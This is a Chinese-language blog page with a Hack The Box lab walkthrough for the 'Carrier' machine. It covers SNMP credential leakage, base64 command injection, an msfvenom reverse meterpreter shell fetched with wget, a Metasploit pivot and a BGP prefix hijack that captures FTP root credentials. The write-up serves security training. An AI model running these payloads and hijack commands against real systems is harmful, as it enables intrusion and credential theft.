@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>HTB靶机渗透实战Writeup_Carrier | 放荡不羁混世间 | B1ngDa0在这儿舞剑</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶机writeup,hackthebox">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","app_key":"pIKFHOkquTOmXNwhTKx9vBnu","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","appkey":"pIKFHOkquTOmXNwhTKx9vBnu","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">B1ngDa0</h5>
+          <a href="mailto:B1ngDa0@08sec.org" title="B1ngDa0@08sec.org" class="mail">
+            
+              <span>B</span>
+            
+              <span>1</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>D</span>
+            
+              <span>a</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>s</span>
+            
+              <span>e</span>
+            
+              <span>c</span>
+            
+              <span>.</span>
+            
+              <span>o</span>
+            
+              <span>r</span>
+            
+              <span>g</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/b1ngda0" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>HTB靶机渗透实战Writeup_Carrier</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">HTB靶机渗透实战Writeup_Carrier</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-09T08:59:17.000Z" itemprop="datePublished" class="page-time">
+  2019-07-09
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-HTB靶机渗透实战Writeup-Carrier"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">HTB靶机渗透实战Writeup_Carrier</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-09 16:59:17" datetime="2019-07-09T08:59:17.000Z"  itemprop="datePublished">2019-07-09</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+
+
+            
+	<span id="/2019/07/09/HTB靶机渗透实战Writeup-Carrier/" class="leancloud_visitors" data-flag-title="HTB靶机渗透实战Writeup_Carrier" title="HTB靶机渗透实战Writeup_Carrier">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/07/09/HTB靶机渗透实战Writeup-Carrier/#comment">
+            <span class="valine-comment-count" data-xid="/2019/07/09/HTB靶机渗透实战Writeup-Carrier/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Carrier的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。  </p>
+<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>SNMP弱口令public泄露  </p>
+<p>Python本地服务器搭建  </p>
+<p>命令执行绕过  </p>
+<p>MSF结合NMAP进行内网扫描  </p>
+<p>BGP前缀劫持  </p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>Carrier靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/155" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/155</a></p>
+<p>目标IP: 10.10.10.105(Linux)</p>
+<p>本机IP: 10.10.14.3(Kali)</p>
+<p>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描</p>
+<p>首先使用NMAP对目标进行端口扫描，以确定下一步的操作：</p>
+<p><code>nmap -sC -sV -oA Carrier 10.10.10.105</code>  #通过默认脚本扫描获取版本并导出为文件</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/Y9ThKbRC/01.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/Y9ThKbRC/01.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p><code>nmap -sU -sV -oA test 10.10.10.105</code> #通过udp扫描获取版本并导出为文件</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/Pq3CKt8Z/02.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/Pq3CKt8Z/02.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p> 得知21、80、161端口开放，且161端口SNMP共同体pulic开启</p>
+<p>因为是靶机渗透，所以账号爆破的操作不被优先考虑。</p>
+<p>对网页进行访问获取更多信息：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/SxG22LSg/2.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/SxG22LSg/2.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>只有一个登陆框以及两个错误代码。</p>
+<p>进行目录爆破：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/dVFZVNY7/0.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/dVFZVNY7/0.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/4x440DG1/11111.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/4x440DG1/11111.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>获得/doc/文件下的</p>
+<p>网络拓扑图：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/m2CFRf0f/3.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/m2CFRf0f/3.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>以及网站系统错误代码文档：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/xdTkKkqn/4.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/xdTkKkqn/4.png" alt title class></a>
+                <p></p>
+            </figure>
+
+
+
+<p>得知：网站使用默认的用户名admin以及密码序列号，我们访问的网页处于AS100机器中，AS200有FTP服务，AS300进行FTP连接操作。</p>
+<p>没有发现其他有用信息，接下来进行161端口的SNMP弱口令pulic的利用：</p>
+<p>所需工具：snmpwalk</p>
+<p><code>snmpwalk -v 1 -c public 10.10.10.105</code> # -v指定协议版本 -c 指定共同体字符串</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/wv17GShr/5.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/wv17GShr/5.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>获得密码NET_45JDX23</p>
+<p>利用凭据登录</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/tCQYBv7r/6.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/tCQYBv7r/6.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/sfZM9CfQ/7.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/sfZM9CfQ/7.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得知：10.120.15.0/24网段中存在FTP服务</p>
+<p>可在diag.php页面进行命令执行。</p>
+<p>## 获取USER权限</p>
+<p>使用burpsuite对diag页面数据进行抓取</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/wMJ36L4c/8.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/wMJ36L4c/8.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>命令参数为check,为base64编码，解码为quagga 与页面显示结果符合。</p>
+<p>直接将简单的Linux命令进行base64编码并代入参数，发现页面返回空白</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/xTvqhGz9/9.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/xTvqhGz9/9.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>测试最简单的命令绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cXVhZ2dhIHwgbHM=    #quagga | ls</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/3x3WTyXm/10.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/3x3WTyXm/10.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>执行成功可以看到user.txt已经躺着那里了，user.txt目标完成</p>
+<h2 id="获取ROOT权限"><a href="#获取ROOT权限" class="headerlink" title="获取ROOT权限"></a>获取ROOT权限</h2><p>已知信息：</p>
+<p>目前为root权限但并不是目标主机10.10.10.105的root，目前我们处于网络拓扑图中的AS100主机</p>
+<p>为了更详细方便的获取信息，使用msfvenom生成elf文件进行反弹shell至msf上.</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=3333 -f elf &gt; shell.elf</code>  #使用linux/x86/meterpreter/reverse_tcp payload，将shell反弹至10.10.14.3的3333端口，生成之后使用python2中的SimpleHTTPServer模块进行快速搭建http服务</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/3wRRkPbw/12.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/3wRRkPbw/12.png" alt title class></a>
+                <p></p>
+            </figure>
+
+
+
+<p>在命令执行的地方获取并执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>在本地msf监听3333端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.3</span><br><span class="line">set LPORT 3333</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/d0x0r4zj/13.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/d0x0r4zj/13.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>在目标机执行./shell.elf </p>
+<p>命令执行处较为麻烦就不进行截图了</p>
+<p>成功获得反弹shell：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/SNhx6Xt3/14.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/SNhx6Xt3/14.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>接下来需要对目标的网络环境进行详细查探：</p>
+<p>添加路由：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set session 1</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/cCQ4qZ6F/16.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/cCQ4qZ6F/16.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>可以看到网络很复杂并且没有目标ip。</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/76JZVS48/17.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/76JZVS48/17.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>route中的ip将通过session 1进行访问</p>
+<p>接下来设置SOCKS代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1090</span><br><span class="line">run -j</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/j2VdkCqW/18.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/j2VdkCqW/18.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>成功设置后</p>
+<p>我们将通过proxychains包 进行代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br></pre></td></tr></table></figure>
+
+<p>未安装可使用以上命令进行安装</p>
+<p>编辑/etc/proxychains.conf 进行配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>添加以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">#add proxy here ...</span><br><span class="line">#meanwile</span><br><span class="line">#defaults set to &quot;tor&quot;</span><br><span class="line">socks4  127.0.0.1 1090</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/9XTfwP1y/19.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/9XTfwP1y/19.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>配置成功，在终端运行proxychains [工具] 将使用代理运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.120.15.0/24 -p 21,22,23,25,80,443,445,3389,8000,8080</span><br></pre></td></tr></table></figure>
+
+<p>使用nmap扫描10.120.15网段中开启的关键端口</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/fTfTBwGL/20.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/fTfTBwGL/20.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现10.120.15.10开放FTP服务</p>
+<p>未获取其他有效信息，现在查看之前已控制主机的网络</p>
+<p>netstat -pantu</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/tgYqqFYZ/21.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/tgYqqFYZ/21.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>有bgp服务的2601端口开放，根据之前得到的信息，我们现在需要进行BGP劫持获得AS200(10.120.15.10) FTP尝试登陆的账号密码</p>
+<p>思路：通过修改bgp路由欺骗AS200将数据传输至已控主机。</p>
+<p>在已控主机中依次运行以下命令</p>
+<p>路由伪造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">config terminal</span><br><span class="line">router bgp 100</span><br><span class="line">network 10.120.15.0/32</span><br><span class="line">end</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>IP伪造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip address add 10.120.15.10/24 dev eth2</span><br></pre></td></tr></table></figure>
+
+<p>现在10.120.15.10已经将数据源源不断的传至已控主机</p>
+<p>为了获得FTP登陆的数据，我们可在已控主机搭建FTP服务</p>
+<p>使用以下FTP脚本：</p>
+<p>代码较冗长，我已上传至Github:</p>
+<p><a href="https://github.com/b1ngda0/FtpServicePython/" target="_blank" rel="noopener">https://github.com/b1ngda0/FtpServicePython/</a></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/wjWxYwTY/22.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/wjWxYwTY/22.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>运行后可以看到已经获取到账号root以及登陆密码</p>
+<p>使用ssh进行登录</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Carrier href="https://i.postimg.cc/1z29f4qW/23.png" title="" data-fancybox="images"><img src="https://i.postimg.cc/1z29f4qW/23.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>已经获取root权限以及root.txt</p>
+<p>渗透完成！</p>
+<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>文中的bgp劫持类似于arp欺骗，靶机环境为一个网关两台路由器，一台路由器连接一台服务器，服务器接收到消息后先找路由器，我们通过路由伪造，使两台路由器地址一样，又进行了IP伪造，使IP离AS200近，于是AS200将数据传输至已控主机，此时我们使用ftp脚本获取或者进行tcpdump抓包就可以获取数据。</p>
+<h1 id="文献参考"><a href="#文献参考" class="headerlink" title="文献参考"></a>文献参考</h1><p>snmap弱口令：</p>
+<p><a href="https://blog.csdn.net/archersaber39/article/details/78932252" target="_blank" rel="noopener">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
+<p>msf代理设置nmap扫描：</p>
+<p><a href="https://blog.csdn.net/h4ck0ne/article/details/50570749" target="_blank" rel="noopener">https://blog.csdn.net/h4ck0ne/article/details/50570749</a></p>
+<p><a href="http://www.blackhillsinfosec.com/use-nmap-meterpreter" target="_blank" rel="noopener">http://www.blackhillsinfosec.com/use-nmap-meterpreter</a></p>
+<p>bgp劫持：</p>
+<p><a href="https://en.wikipedia.org/wiki/BGP_hijacking" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/BGP_hijacking</a> </p>
+<p><a href="https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking" target="_blank" rel="noopener">https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking</a> </p>
+<p><a href="https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo" target="_blank" rel="noopener">https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo</a></p>
+<p><a href="http://cs.slu.edu/~espositof/teaching/4650/lab3/" target="_blank" rel="noopener">http://cs.slu.edu/~espositof/teaching/4650/lab3/</a></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-07-09T09:09:10.697Z" itemprop="dateUpdated">2019-07-09 17:09:10</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/07/09/HTB靶机渗透实战Writeup-Carrier/" target="_blank" rel="external">https://www.b1ngda0.cn/2019/07/09/HTB靶机渗透实战Writeup-Carrier/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.b1ngda0.cn">
+            <img src="/img/avatar.jpg" alt="B1ngDa0">
+            B1ngDa0
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackthebox/">hackthebox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机writeup/">靶机writeup</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/09/HTB靶机渗透实战Writeup-Carrier/&title=《HTB靶机渗透实战Writeup_Carrier》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/09/HTB靶机渗透实战Writeup-Carrier/&title=《HTB靶机渗透实战Writeup_Carrier》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/07/09/第一篇博客/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">第一篇博客</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#本文涉及知识点"><span class="post-toc-number">2.</span> <span class="post-toc-text">本文涉及知识点:</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战"><span class="post-toc-number">3.</span> <span class="post-toc-text">实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">信息收集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获取ROOT权限"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">获取ROOT权限</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#个人感悟"><span class="post-toc-number">4.</span> <span class="post-toc-text">个人感悟</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文献参考"><span class="post-toc-number">5.</span> <span class="post-toc-text">文献参考</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.b1ngda0.cn" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                B1ngDa0 &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/09/HTB靶机渗透实战Writeup-Carrier/&title=《HTB靶机渗透实战Writeup_Carrier》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/09/HTB靶机渗透实战Writeup-Carrier/&title=《HTB靶机渗透实战Writeup_Carrier》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
